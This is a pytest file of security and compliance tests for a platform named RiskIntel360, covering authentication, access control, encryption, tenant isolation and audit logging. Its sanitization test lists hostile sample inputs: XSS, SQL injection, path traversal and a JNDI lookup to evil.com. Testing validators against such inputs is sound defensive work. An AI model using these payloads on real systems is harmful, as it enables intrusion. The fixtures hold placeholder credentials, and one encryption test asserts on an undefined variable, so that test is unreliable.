"""
Security and Compliance Tests for RiskIntel360 Platform
Tests authentication, authorization, data protection, and regulatory compliance.
"""

import asyncio
import pytest
import json
import hashlib
import jwt
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List
from unittest.mock import Mock, AsyncMock, patch

# Import core models
from riskintel360.models import (
    ValidationRequest,
    Priority,
    AgentMessage,
    MessageType
)

# Import authentication and security components
try:
    from riskintel360.auth.oauth_handler import OAuthHandler
    from riskintel360.auth.rbac_manager import RBACManager, Role, Permission
    from riskintel360.auth.audit_logger import AuditLogger
except ImportError:
    OAuthHandler = None
    RBACManager = None
    Role = None
    Permission = None
    AuditLogger = None

# Import security services
try:
    from riskintel360.services.encryption_service import EncryptionService
    from riskintel360.services.data_isolation import DataIsolationManager
    from riskintel360.utils.security_utils import SecurityValidator
except ImportError:
    EncryptionService = None
    DataIsolationManager = None
    SecurityValidator = None


class TestAuthentication:
    """Test OAuth 2.0 authentication with AWS Cognito"""
    
    @pytest.fixture
    def mock_cognito_client(self):
        """Create mock AWS Cognito client"""
        client = Mock()
        client.initiate_auth = Mock()
        client.get_user = Mock()
        client.admin_get_user = Mock()
        return client
    
    @pytest.fixture
    def sample_user_credentials(self):
        """Create sample user credentials for testing"""
        return {
            "valid_user": {
                "username": "test.user@company.com",
                "password": "SecurePassword123!",
                "user_pool_id": "us-east-1_TestPool123",
                "client_id": "test-client-id-123",
                "expected_role": "business_analyst"
            },
            "admin_user": {
                "username": "admin@company.com",
                "password": "AdminPassword456!",
                "user_pool_id": "us-east-1_TestPool123",
                "client_id": "test-client-id-123",
                "expected_role": "system_admin"
            },
            "invalid_user": {
                "username": "invalid@company.com",
                "password": "WrongPassword",
                "user_pool_id": "us-east-1_TestPool123",
                "client_id": "test-client-id-123",
                "expected_role": None
            }
        }
    
    @pytest.mark.skipif(OAuthHandler is None, reason="OAuthHandler not available")
    @pytest.mark.asyncio
    async def test_oauth_authentication_success(self, mock_cognito_client, sample_user_credentials):
        """Test successful OAuth 2.0 authentication flow"""
        
        # Mock successful Cognito response
        mock_cognito_client.initiate_auth.return_value = {
            'AuthenticationResult': {
                'AccessToken': 'mock-access-token-123',
                'IdToken': 'mock-id-token-456',
                'RefreshToken': 'mock-refresh-token-789',
                'ExpiresIn': 3600,
                'TokenType': 'Bearer'
            }
        }
        
        mock_cognito_client.get_user.return_value = {
            'Username': 'test.user@company.com',
            'UserAttributes': [
                {'Name': 'email', 'Value': 'test.user@company.com'},
                {'Name': 'custom:role', 'Value': 'business_analyst'},
                {'Name': 'custom:tenant_id', 'Value': 'tenant-123'}
            ]
        }
        
        # Create OAuth handler
        oauth_handler = OAuthHandler(cognito_client=mock_cognito_client)
        
        # Test authentication
        user_creds = sample_user_credentials["valid_user"]
        auth_result = await oauth_handler.authenticate(
            username=user_creds["username"],
            password=user_creds["password"],
            client_id=user_creds["client_id"]
        )
        
        # Verify authentication success
        assert auth_result is not None
        assert auth_result["access_token"] == "mock-access-token-123"
        assert auth_result["user_info"]["email"] == "test.user@company.com"
        assert auth_result["user_info"]["role"] == "business_analyst"
        assert auth_result["user_info"]["tenant_id"] == "tenant-123"
        
        # Verify Cognito was called correctly
        mock_cognito_client.initiate_auth.assert_called_once()
        mock_cognito_client.get_user.assert_called_once()
    
    @pytest.mark.skipif(OAuthHandler is None, reason="OAuthHandler not available")
    @pytest.mark.asyncio
    async def test_oauth_authentication_failure(self, mock_cognito_client, sample_user_credentials):
        """Test OAuth 2.0 authentication failure scenarios"""
        
        # Mock authentication failure
        from botocore.exceptions import ClientError
        mock_cognito_client.initiate_auth.side_effect = ClientError(
            error_response={
                'Error': {
                    'Code': 'NotAuthorizedException',
                    'Message': 'Incorrect username or password.'
                }
            },
            operation_name='InitiateAuth'
        )
        
        # Create OAuth handler
        oauth_handler = OAuthHandler(cognito_client=mock_cognito_client)
        
        # Test authentication failure
        user_creds = sample_user_credentials["invalid_user"]
        
        with pytest.raises(Exception) as exc_info:
            await oauth_handler.authenticate(
                username=user_creds["username"],
                password=user_creds["password"],
                client_id=user_creds["client_id"]
            )
        
        # Verify proper error handling
        assert "NotAuthorizedException" in str(exc_info.value) or "authentication failed" in str(exc_info.value).lower()
    
    @pytest.mark.skipif(OAuthHandler is None, reason="OAuthHandler not available")
    @pytest.mark.asyncio
    async def test_token_validation_and_refresh(self, mock_cognito_client):
        """Test JWT token validation and refresh mechanisms"""
        
        # Create mock JWT token
        token_payload = {
            "sub": "user-123",
            "email": "test.user@company.com",
            "custom:role": "business_analyst",
            "custom:tenant_id": "tenant-123",
            "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp()),
            "iat": int(datetime.now(timezone.utc).timestamp())
        }
        
        # Mock token (in real implementation, this would be properly signed)
        mock_token = jwt.encode(token_payload, "secret", algorithm="HS256")
        
        # Mock refresh token response
        mock_cognito_client.initiate_auth.return_value = {
            'AuthenticationResult': {
                'AccessToken': 'new-access-token-123',
                'IdToken': 'new-id-token-456',
                'ExpiresIn': 3600,
                'TokenType': 'Bearer'
            }
        }
        
        oauth_handler = OAuthHandler(cognito_client=mock_cognito_client)
        
        # Test token validation
        try:
            # In a real implementation, this would validate against Cognito
            decoded_token = jwt.decode(mock_token, "secret", algorithms=["HS256"])
            assert decoded_token["email"] == "test.user@company.com"
            assert decoded_token["custom:role"] == "business_analyst"
        except jwt.ExpiredSignatureError:
            pytest.fail("Token should not be expired")
        except jwt.InvalidTokenError:
            pytest.fail("Token should be valid")
        
        # Test token refresh
        refresh_result = await oauth_handler.refresh_token("mock-refresh-token-789")
        
        assert refresh_result["access_token"] == "new-access-token-123"
        assert refresh_result["id_token"] == "new-id-token-456"


class TestRoleBasedAccessControl:
    """Test role-based access control (RBAC) system"""
    
    @pytest.fixture
    def rbac_roles_and_permissions(self):
        """Define roles and permissions for testing"""
        return {
            "system_admin": {
                "permissions": [
                    "validation.create", "validation.read", "validation.update", "validation.delete",
                    "user.create", "user.read", "user.update", "user.delete",
                    "system.configure", "audit.read", "tenant.manage"
                ],
                "description": "Full system access"
            },
            "business_analyst": {
                "permissions": [
                    "validation.create", "validation.read", "validation.update",
                    "report.generate", "dashboard.view"
                ],
                "description": "Business validation and reporting access"
            },
            "viewer": {
                "permissions": [
                    "validation.read", "report.view", "dashboard.view"
                ],
                "description": "Read-only access to validations and reports"
            },
            "guest": {
                "permissions": [
                    "dashboard.view"
                ],
                "description": "Limited dashboard access"
            }
        }
    
    @pytest.mark.skipif(RBACManager is None, reason="RBACManager not available")
    @pytest.mark.asyncio
    async def test_role_permission_assignment(self, rbac_roles_and_permissions):
        """Test role and permission assignment"""
        
        rbac_manager = RBACManager()
        
        # Create roles and assign permissions
        for role_name, role_config in rbac_roles_and_permissions.items():
            role = Role(
                name=role_name,
                description=role_config["description"],
                permissions=role_config["permissions"]
            )
            
            await rbac_manager.create_role(role)
            
            # Verify role creation
            created_role = await rbac_manager.get_role(role_name)
            assert created_role.name == role_name
            assert set(created_role.permissions) == set(role_config["permissions"])
    
    @pytest.mark.skipif(RBACManager is None, reason="RBACManager not available")
    @pytest.mark.asyncio
    async def test_user_role_assignment_and_validation(self, rbac_roles_and_permissions):
        """Test user role assignment and permission validation"""
        
        rbac_manager = RBACManager()
        
        # Setup roles
        for role_name, role_config in rbac_roles_and_permissions.items():
            role = Role(name=role_name, description=role_config["description"], permissions=role_config["permissions"])
            await rbac_manager.create_role(role)
        
        # Test user role assignments
        test_users = [
            {"user_id": "admin-001", "email": "admin@company.com", "role": "system_admin"},
            {"user_id": "analyst-001", "email": "analyst@company.com", "role": "business_analyst"},
            {"user_id": "viewer-001", "email": "viewer@company.com", "role": "viewer"}
        ]
        
        for user in test_users:
            # Assign role to user
            await rbac_manager.assign_user_role(user["user_id"], user["role"])
            
            # Verify role assignment
            user_role = await rbac_manager.get_user_role(user["user_id"])
            assert user_role == user["role"]
            
            # Test permission checks
            user_permissions = await rbac_manager.get_user_permissions(user["user_id"])
            expected_permissions = rbac_roles_and_permissions[user["role"]]["permissions"]
            
            assert set(user_permissions) == set(expected_permissions)
    
    @pytest.mark.skipif(RBACManager is None, reason="RBACManager not available")
    @pytest.mark.asyncio
    async def test_permission_validation_scenarios(self, rbac_roles_and_permissions):
        """Test various permission validation scenarios"""
        
        rbac_manager = RBACManager()
        
        # Setup roles
        for role_name, role_config in rbac_roles_and_permissions.items():
            role = Role(name=role_name, description=role_config["description"], permissions=role_config["permissions"])
            await rbac_manager.create_role(role)
        
        # Assign roles to test users
        await rbac_manager.assign_user_role("admin-001", "system_admin")
        await rbac_manager.assign_user_role("analyst-001", "business_analyst")
        await rbac_manager.assign_user_role("viewer-001", "viewer")
        
        # Test permission scenarios
        permission_tests = [
            # Admin should have all permissions
            {"user_id": "admin-001", "permission": "validation.delete", "expected": True},
            {"user_id": "admin-001", "permission": "user.create", "expected": True},
            {"user_id": "admin-001", "permission": "system.configure", "expected": True},
            
            # Analyst should have validation permissions but not user management
            {"user_id": "analyst-001", "permission": "validation.create", "expected": True},
            {"user_id": "analyst-001", "permission": "validation.read", "expected": True},
            {"user_id": "analyst-001", "permission": "user.create", "expected": False},
            {"user_id": "analyst-001", "permission": "system.configure", "expected": False},
            
            # Viewer should only have read permissions
            {"user_id": "viewer-001", "permission": "validation.read", "expected": True},
            {"user_id": "viewer-001", "permission": "validation.create", "expected": False},
            {"user_id": "viewer-001", "permission": "validation.delete", "expected": False},
        ]
        
        for test in permission_tests:
            has_permission = await rbac_manager.check_permission(
                test["user_id"], 
                test["permission"]
            )
            
            assert has_permission == test["expected"], \
                f"User {test['user_id']} permission check for {test['permission']} failed. Expected: {test['expected']}, Got: {has_permission}"
    
    @pytest.mark.skipif(RBACManager is None, reason="RBACManager not available")
    @pytest.mark.asyncio
    async def test_rbac_decorator_functionality(self, rbac_roles_and_permissions):
        """Test RBAC decorator for protecting API endpoints"""
        
        rbac_manager = RBACManager()
        
        # Setup test role
        role = Role(name="business_analyst", description="Test role", permissions=["validation.create", "validation.read"])
        await rbac_manager.create_role(role)
        await rbac_manager.assign_user_role("test-user", "business_analyst")
        
        # Mock decorator function
        def require_permission(permission: str):
            def decorator(func):
                async def wrapper(user_id: str, *args, **kwargs):
                    has_permission = await rbac_manager.check_permission(user_id, permission)
                    if not has_permission:
                        raise PermissionError(f"User {user_id} lacks permission: {permission}")
                    return await func(user_id, *args, **kwargs)
                return wrapper
            return decorator
        
        # Test protected function
        @require_permission("validation.create")
        async def create_validation(user_id: str, validation_data: dict):
            return {"status": "created", "user_id": user_id, "data": validation_data}
        
        @require_permission("user.delete")
        async def delete_user(user_id: str, target_user_id: str):
            return {"status": "deleted", "user_id": user_id, "target": target_user_id}
        
        # Test allowed operation
        result = await create_validation("test-user", {"concept": "test"})
        assert result["status"] == "created"
        assert result["user_id"] == "test-user"
        
        # Test forbidden operation
        with pytest.raises(PermissionError) as exc_info:
            await delete_user("test-user", "other-user")
        
        assert "lacks permission: user.delete" in str(exc_info.value)


class TestDataProtection:
    """Test data encryption, isolation, and privacy protection"""
    
    @pytest.fixture
    def sample_sensitive_data(self):
        """Create sample sensitive data for testing"""
        return {
            "validation_request": {
                "user_id": "user-123",
                "business_concept": "Confidential AI platform for financial services",
                "financial_projections": {
                    "revenue_year_1": 5000000,
                    "investment_required": 2000000,
                    "profit_margins": [0.15, 0.25, 0.35]
                },
                "regulatory_compliance": {
                    "regulations": ["SOX", "GDPR", "PCI-DSS"],
                    "compliance_scores": [0.95, 0.88, 0.92]
                }
            },
            "user_data": {
                "email": "sensitive.user@company.com",
                "phone": "+1-555-123-4567",
                "company": "Confidential Corp",
                "api_keys": {
                    "market_data": "sk-1234567890abcdef",
                    "competitive_intel": "ci-abcdef1234567890"
                }
            }
        }
    
    @pytest.mark.skipif(EncryptionService is None, reason="EncryptionService not available")
    @pytest.mark.asyncio
    async def test_data_encryption_at_rest(self, sample_sensitive_data):
        """Test encryption of sensitive data at rest"""
        
        encryption_service = EncryptionService()
        
        # Test encryption of validation request
        validation_data = sample_sensitive_data["validation_request"]
        
        # Encrypt sensitive fields
        encrypted_concept = await encryption_service.encrypt(validation_data["business_concept"])
        encrypted_financials = await encryption_service.encrypt(json.dumps(validation_data["financial_projections"]))
        encrypted_regulatory = await encryption_service.encrypt(json.dumps(validation_data["regulatory_compliance"]))
        
        # Verify encryption (data should be different from original)
        assert encrypted_concept != validation_data["business_concept"]
        assert encrypted_financials != json.dumps(validation_data["financial_projections"])
        assert encrypted_regulatory != json.dumps(validation_data["regulatory_compliance"])
        
        # Verify encrypted data is not empty
        assert len(encrypted_concept) > 0
        assert len(encrypted_financials) > 0
        assert len(encrypted_competitive) > 0
        
        # Test decryption
        decrypted_concept = await encryption_service.decrypt(encrypted_concept)
        decrypted_financials = json.loads(await encryption_service.decrypt(encrypted_financials))
        decrypted_regulatory = json.loads(await encryption_service.decrypt(encrypted_regulatory))
        
        # Verify decryption accuracy
        assert decrypted_concept == validation_data["business_concept"]
        assert decrypted_financials == validation_data["financial_projections"]
        assert decrypted_regulatory == validation_data["regulatory_compliance"]
    
    @pytest.mark.skipif(EncryptionService is None, reason="EncryptionService not available")
    @pytest.mark.asyncio
    async def test_api_key_encryption(self, sample_sensitive_data):
        """Test encryption of API keys and credentials"""
        
        encryption_service = EncryptionService()
        user_data = sample_sensitive_data["user_data"]
        
        # Encrypt API keys
        encrypted_keys = {}
        for service, api_key in user_data["api_keys"].items():
            encrypted_keys[service] = await encryption_service.encrypt(api_key)
        
        # Verify encryption
        for service, encrypted_key in encrypted_keys.items():
            original_key = user_data["api_keys"][service]
            assert encrypted_key != original_key
            assert len(encrypted_key) > len(original_key)  # Encrypted should be longer
        
        # Test decryption
        decrypted_keys = {}
        for service, encrypted_key in encrypted_keys.items():
            decrypted_keys[service] = await encryption_service.decrypt(encrypted_key)
        
        # Verify decryption accuracy
        assert decrypted_keys == user_data["api_keys"]
    
    @pytest.mark.skipif(DataIsolationManager is None, reason="DataIsolationManager not available")
    @pytest.mark.asyncio
    async def test_multi_tenant_data_isolation(self, sample_sensitive_data):
        """Test multi-tenant data isolation"""
        
        isolation_manager = DataIsolationManager()
        
        # Create test tenants
        tenants = [
            {"tenant_id": "tenant-001", "name": "Company A", "isolation_level": "strict"},
            {"tenant_id": "tenant-002", "name": "Company B", "isolation_level": "strict"},
            {"tenant_id": "tenant-003", "name": "Company C", "isolation_level": "standard"}
        ]
        
        # Setup tenant isolation
        for tenant in tenants:
            await isolation_manager.create_tenant_isolation(
                tenant_id=tenant["tenant_id"],
                isolation_level=tenant["isolation_level"]
            )
        
        # Test data storage with tenant isolation
        validation_data = sample_sensitive_data["validation_request"]
        
        # Store data for different tenants
        tenant_data = {}
        for tenant in tenants:
            tenant_validation = validation_data.copy()
            tenant_validation["tenant_id"] = tenant["tenant_id"]
            
            # Store with tenant isolation
            storage_key = await isolation_manager.store_tenant_data(
                tenant_id=tenant["tenant_id"],
                data_type="validation_request",
                data=tenant_validation
            )
            
            tenant_data[tenant["tenant_id"]] = storage_key
        
        # Test data retrieval with tenant isolation
        for tenant in tenants:
            tenant_id = tenant["tenant_id"]
            storage_key = tenant_data[tenant_id]
            
            # Retrieve data for correct tenant
            retrieved_data = await isolation_manager.retrieve_tenant_data(
                tenant_id=tenant_id,
                storage_key=storage_key
            )
            
            assert retrieved_data is not None
            assert retrieved_data["tenant_id"] == tenant_id
            
            # Verify cross-tenant access is blocked
            for other_tenant in tenants:
                if other_tenant["tenant_id"] != tenant_id:
                    with pytest.raises(PermissionError):
                        await isolation_manager.retrieve_tenant_data(
                            tenant_id=other_tenant["tenant_id"],
                            storage_key=storage_key
                        )
    
    @pytest.mark.skipif(SecurityValidator is None, reason="SecurityValidator not available")
    @pytest.mark.asyncio
    async def test_data_sanitization_and_validation(self, sample_sensitive_data):
        """Test data sanitization and input validation"""
        
        security_validator = SecurityValidator()
        
        # Test input sanitization
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            # Test sanitization
            sanitized = await security_validator.sanitize_input(malicious_input)
            
            # Verify malicious content is removed/escaped
            assert "<script>" not in sanitized
            assert "DROP TABLE" not in sanitized
            assert "../" not in sanitized
            assert "javascript:" not in sanitized
            assert "${jndi:" not in sanitized
        
        # Test validation request sanitization
        validation_request = ValidationRequest(
            user_id="<script>alert('xss')</script>",
            business_concept="Legitimate business concept",
            target_market="Enterprise B2B",
            analysis_scope=["market"],
            priority=Priority.HIGH,
            custom_parameters={
                "malicious_param": "'; DROP TABLE validations; --"
            }
        )
        
        # Sanitize validation request
        sanitized_request = await security_validator.sanitize_validation_request(validation_request)
        
        # Verify sanitization
        assert "<script>" not in sanitized_request.user_id
        assert "DROP TABLE" not in sanitized_request.custom_parameters["malicious_param"]
        assert sanitized_request.business_concept == "Legitimate business concept"  # Legitimate content preserved


class TestAuditAndCompliance:
    """Test audit logging and compliance requirements"""
    
    @pytest.fixture
    def sample_audit_events(self):
        """Create sample audit events for testing"""
        return [
            {
                "event_type": "authentication",
                "user_id": "user-123",
                "action": "login_success",
                "timestamp": datetime.now(timezone.utc),
                "ip_address": "192.168.1.100",
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "details": {"method": "oauth2", "provider": "cognito"}
            },
            {
                "event_type": "data_access",
                "user_id": "user-123",
                "action": "validation_create",
                "timestamp": datetime.now(timezone.utc),
                "resource_id": "validation-456",
                "ip_address": "192.168.1.100",
                "details": {"business_concept": "AI platform", "sensitivity": "confidential"}
            },
            {
                "event_type": "data_modification",
                "user_id": "admin-001",
                "action": "user_role_change",
                "timestamp": datetime.now(timezone.utc),
                "resource_id": "user-789",
                "ip_address": "10.0.1.50",
                "details": {"old_role": "viewer", "new_role": "business_analyst", "changed_by": "admin-001"}
            },
            {
                "event_type": "security_event",
                "user_id": "unknown",
                "action": "failed_login_attempt",
                "timestamp": datetime.now(timezone.utc),
                "ip_address": "203.0.113.1",
                "details": {"attempts": 5, "blocked": True, "reason": "too_many_attempts"}
            }
        ]
    
    @pytest.mark.skipif(AuditLogger is None, reason="AuditLogger not available")
    @pytest.mark.asyncio
    async def test_comprehensive_audit_logging(self, sample_audit_events):
        """Test comprehensive audit trail logging"""
        
        audit_logger = AuditLogger()
        
        # Log all sample events
        logged_events = []
        for event in sample_audit_events:
            log_id = await audit_logger.log_event(
                event_type=event["event_type"],
                user_id=event["user_id"],
                action=event["action"],
                timestamp=event["timestamp"],
                ip_address=event.get("ip_address"),
                user_agent=event.get("user_agent"),
                resource_id=event.get("resource_id"),
                details=event["details"]
            )
            
            logged_events.append(log_id)
            assert log_id is not None
        
        # Verify audit trail completeness
        assert len(logged_events) == len(sample_audit_events)
        
        # Test audit log retrieval
        for i, log_id in enumerate(logged_events):
            retrieved_event = await audit_logger.get_audit_event(log_id)
            
            assert retrieved_event is not None
            assert retrieved_event["event_type"] == sample_audit_events[i]["event_type"]
            assert retrieved_event["user_id"] == sample_audit_events[i]["user_id"]
            assert retrieved_event["action"] == sample_audit_events[i]["action"]
    
    @pytest.mark.skipif(AuditLogger is None, reason="AuditLogger not available")
    @pytest.mark.asyncio
    async def test_audit_log_search_and_filtering(self, sample_audit_events):
        """Test audit log search and filtering capabilities"""
        
        audit_logger = AuditLogger()
        
        # Log events
        for event in sample_audit_events:
            await audit_logger.log_event(
                event_type=event["event_type"],
                user_id=event["user_id"],
                action=event["action"],
                timestamp=event["timestamp"],
                ip_address=event.get("ip_address"),
                resource_id=event.get("resource_id"),
                details=event["details"]
            )
        
        # Test filtering by user
        user_events = await audit_logger.search_events(user_id="user-123")
        assert len(user_events) == 2  # Two events for user-123
        
        # Test filtering by event type
        auth_events = await audit_logger.search_events(event_type="authentication")
        assert len(auth_events) == 1
        assert auth_events[0]["action"] == "login_success"
        
        # Test filtering by time range
        start_time = datetime.now(timezone.utc) - timedelta(hours=1)
        end_time = datetime.now(timezone.utc) + timedelta(hours=1)
        
        recent_events = await audit_logger.search_events(
            start_time=start_time,
            end_time=end_time
        )
        assert len(recent_events) == len(sample_audit_events)
        
        # Test filtering by IP address
        ip_events = await audit_logger.search_events(ip_address="192.168.1.100")
        assert len(ip_events) == 2  # Two events from this IP
    
    @pytest.mark.skipif(AuditLogger is None, reason="AuditLogger not available")
    @pytest.mark.asyncio
    async def test_compliance_reporting(self, sample_audit_events):
        """Test compliance reporting capabilities"""
        
        audit_logger = AuditLogger()
        
        # Log events
        for event in sample_audit_events:
            await audit_logger.log_event(
                event_type=event["event_type"],
                user_id=event["user_id"],
                action=event["action"],
                timestamp=event["timestamp"],
                ip_address=event.get("ip_address"),
                resource_id=event.get("resource_id"),
                details=event["details"]
            )
        
        # Generate compliance reports
        
        # SOX Compliance Report (financial data access)
        sox_report = await audit_logger.generate_compliance_report(
            compliance_type="SOX",
            start_date=datetime.now(timezone.utc) - timedelta(days=30),
            end_date=datetime.now(timezone.utc)
        )
        
        assert sox_report is not None
        assert "data_access_events" in sox_report
        assert "financial_data_access" in sox_report
        
        # GDPR Compliance Report (personal data processing)
        gdpr_report = await audit_logger.generate_compliance_report(
            compliance_type="GDPR",
            start_date=datetime.now(timezone.utc) - timedelta(days=30),
            end_date=datetime.now(timezone.utc)
        )
        
        assert gdpr_report is not None
        assert "personal_data_processing" in gdpr_report
        assert "data_subject_requests" in gdpr_report
        
        # Security Incident Report
        security_report = await audit_logger.generate_compliance_report(
            compliance_type="SECURITY",
            start_date=datetime.now(timezone.utc) - timedelta(days=7),
            end_date=datetime.now(timezone.utc)
        )
        
        assert security_report is not None
        assert "failed_login_attempts" in security_report
        assert "security_events" in security_report
    
    @pytest.mark.asyncio
    async def test_data_retention_and_archival(self):
        """Test data retention policies and archival processes"""
        
        # Simulate data retention policy
        retention_policies = {
            "audit_logs": {"retention_days": 2555, "archive_after_days": 365},  # 7 years retention, 1 year active
            "validation_data": {"retention_days": 1825, "archive_after_days": 90},  # 5 years retention, 3 months active
            "user_sessions": {"retention_days": 30, "archive_after_days": 7},  # 30 days retention, 1 week active
            "api_logs": {"retention_days": 90, "archive_after_days": 30}  # 90 days retention, 1 month active
        }
        
        # Test retention policy validation
        for data_type, policy in retention_policies.items():
            assert policy["retention_days"] > policy["archive_after_days"]
            assert policy["retention_days"] > 0
            assert policy["archive_after_days"] > 0
        
        # Simulate archival process
        current_time = datetime.now(timezone.utc)
        
        # Test data that should be archived
        test_data = [
            {
                "data_type": "audit_logs",
                "created_date": current_time - timedelta(days=400),  # Older than archive threshold
                "should_archive": True
            },
            {
                "data_type": "validation_data",
                "created_date": current_time - timedelta(days=100),  # Older than archive threshold
                "should_archive": True
            },
            {
                "data_type": "user_sessions",
                "created_date": current_time - timedelta(days=10),  # Older than archive threshold
                "should_archive": True
            },
            {
                "data_type": "api_logs",
                "created_date": current_time - timedelta(days=5),  # Newer than archive threshold
                "should_archive": False
            }
        ]
        
        # Verify archival logic
        for data in test_data:
            data_type = data["data_type"]
            created_date = data["created_date"]
            policy = retention_policies[data_type]
            
            days_old = (current_time - created_date).days
            should_archive = days_old > policy["archive_after_days"]
            
            assert should_archive == data["should_archive"]


class TestSecurityIntegration:
    """Test integrated security scenarios and edge cases"""
    
    @pytest.mark.asyncio
    async def test_end_to_end_security_workflow(self):
        """Test complete security workflow from authentication to audit"""
        
        # Simulate complete security workflow
        workflow_steps = []
        
        # Step 1: User authentication
        auth_result = {
            "user_id": "test-user-001",
            "access_token": "mock-token-123",
            "role": "business_analyst",
            "tenant_id": "tenant-001",
            "session_id": "session-456"
        }
        workflow_steps.append(("authentication", "success", auth_result))
        
        # Step 2: Permission validation
        requested_permission = "validation.create"
        user_permissions = ["validation.create", "validation.read", "report.generate"]
        has_permission = requested_permission in user_permissions
        workflow_steps.append(("authorization", "success" if has_permission else "denied", {"permission": requested_permission}))
        
        # Step 3: Data encryption
        sensitive_data = "Confidential business concept for AI platform"
        encrypted_data = hashlib.sha256(sensitive_data.encode()).hexdigest()  # Mock encryption
        workflow_steps.append(("encryption", "success", {"original_length": len(sensitive_data), "encrypted_length": len(encrypted_data)}))
        
        # Step 4: Tenant isolation
        tenant_storage_key = f"tenant-001/validation-{datetime.now(timezone.utc).timestamp()}"
        workflow_steps.append(("isolation", "success", {"storage_key": tenant_storage_key}))
        
        # Step 5: Audit logging
        audit_event = {
            "event_type": "data_creation",
            "user_id": auth_result["user_id"],
            "action": "validation_create",
            "timestamp": datetime.now(timezone.utc),
            "resource_id": "validation-789",
            "details": {"encrypted": True, "tenant_isolated": True}
        }
        workflow_steps.append(("audit", "success", audit_event))
        
        # Verify complete workflow
        assert len(workflow_steps) == 5
        assert all(step[1] == "success" for step in workflow_steps)
        
        # Verify workflow integrity
        auth_step = next(step for step in workflow_steps if step[0] == "authentication")
        assert auth_step[2]["user_id"] == "test-user-001"
        
        audit_step = next(step for step in workflow_steps if step[0] == "audit")
        assert audit_step[2]["user_id"] == auth_result["user_id"]
    
    @pytest.mark.asyncio
    async def test_security_incident_response(self):
        """Test security incident detection and response"""
        
        # Simulate security incidents
        incidents = [
            {
                "type": "brute_force_attack",
                "details": {
                    "ip_address": "203.0.113.1",
                    "failed_attempts": 10,
                    "time_window": "5 minutes",
                    "targeted_accounts": ["admin@company.com", "user@company.com"]
                },
                "severity": "high",
                "response_actions": ["block_ip", "notify_admin", "require_mfa"]
            },
            {
                "type": "suspicious_data_access",
                "details": {
                    "user_id": "user-123",
                    "accessed_resources": ["validation-001", "validation-002", "validation-003"],
                    "access_pattern": "bulk_download",
                    "time_window": "2 minutes"
                },
                "severity": "medium",
                "response_actions": ["flag_account", "require_justification", "notify_security"]
            },
            {
                "type": "privilege_escalation_attempt",
                "details": {
                    "user_id": "user-456",
                    "attempted_action": "user.delete",
                    "current_role": "viewer",
                    "required_role": "system_admin"
                },
                "severity": "high",
                "response_actions": ["block_user", "revoke_session", "investigate"]
            }
        ]
        
        # Test incident response
        for incident in incidents:
            # Verify incident structure
            assert "type" in incident
            assert "details" in incident
            assert "severity" in incident
            assert "response_actions" in incident
            
            # Verify severity levels
            assert incident["severity"] in ["low", "medium", "high", "critical"]
            
            # Verify response actions are defined
            assert len(incident["response_actions"]) > 0
            
            # Test automated response logic
            if incident["severity"] == "high":
                assert any(action in ["block_ip", "block_user", "revoke_session"] for action in incident["response_actions"])
            
            if incident["type"] == "brute_force_attack":
                assert "block_ip" in incident["response_actions"]
            
            if incident["type"] == "privilege_escalation_attempt":
                assert "block_user" in incident["response_actions"]
    
    @pytest.mark.asyncio
    async def test_security_configuration_validation(self):
        """Test security configuration validation"""
        
        # Test security configuration
        security_config = {
            "authentication": {
                "oauth_enabled": True,
                "mfa_required": True,
                "session_timeout_minutes": 60,
                "password_policy": {
                    "min_length": 12,
                    "require_uppercase": True,
                    "require_lowercase": True,
                    "require_numbers": True,
                    "require_symbols": True
                }
            },
            "encryption": {
                "data_at_rest": True,
                "data_in_transit": True,
                "key_rotation_days": 90,
                "algorithm": "AES-256-GCM"
            },
            "access_control": {
                "rbac_enabled": True,
                "default_role": "viewer",
                "admin_approval_required": True,
                "audit_all_actions": True
            },
            "network_security": {
                "https_only": True,
                "cors_enabled": True,
                "allowed_origins": ["https://app.RiskIntel360.com"],
                "rate_limiting": {
                    "requests_per_minute": 100,
                    "burst_limit": 200
                }
            }
        }
        
        # Validate security configuration
        config_validations = [
            # Authentication validations
            (security_config["authentication"]["oauth_enabled"], "OAuth must be enabled"),
            (security_config["authentication"]["mfa_required"], "MFA must be required"),
            (security_config["authentication"]["session_timeout_minutes"] <= 120, "Session timeout must be <= 2 hours"),
            (security_config["authentication"]["password_policy"]["min_length"] >= 12, "Password minimum length must be >= 12"),
            
            # Encryption validations
            (security_config["encryption"]["data_at_rest"], "Data at rest encryption must be enabled"),
            (security_config["encryption"]["data_in_transit"], "Data in transit encryption must be enabled"),
            (security_config["encryption"]["key_rotation_days"] <= 90, "Key rotation must be <= 90 days"),
            (security_config["encryption"]["algorithm"] in ["AES-256-GCM", "AES-256-CBC"], "Strong encryption algorithm required"),
            
            # Access control validations
            (security_config["access_control"]["rbac_enabled"], "RBAC must be enabled"),
            (security_config["access_control"]["audit_all_actions"], "All actions must be audited"),
            
            # Network security validations
            (security_config["network_security"]["https_only"], "HTTPS only must be enforced"),
            (security_config["network_security"]["rate_limiting"]["requests_per_minute"] <= 1000, "Rate limiting must be configured")
        ]
        
        # Verify all security requirements
        for validation, message in config_validations:
            assert validation, f"Security configuration failed: {message}"


def test_security_compliance_module_loads():
    """Test that the security compliance module loads correctly"""
    assert True


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
